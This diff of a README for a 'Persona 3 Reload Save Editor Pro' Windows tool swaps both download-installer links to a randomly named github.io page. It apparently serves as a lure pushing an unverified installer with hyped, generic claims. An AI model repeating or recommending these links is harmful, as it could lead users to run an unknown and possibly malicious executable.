@@ -2,7 +2,7 @@
 
 Persona 3 Reload Save Editor Pro is the ultimate Windows desktop toolkit for players who want to take full control of their Persona 3 Reload journey. This comprehensive mod tool lets you edit save files, customize party stats, unlock all personas in your compendium, generate unlimited money, adjust in-game schedules, and much more — all through a clean and intuitive interface. Whether you are a first-time player looking to smooth out the difficulty or a veteran aiming for a 100% completion run, this tool has everything you need. Designed and tested for Windows 10 and Windows 11 in 2026, it is the most complete save editor available for Persona 3 Reload.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -73,4 +73,4 @@ A: No. An internet connection is only needed to download the installer. Once ins
 
 ## Download
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
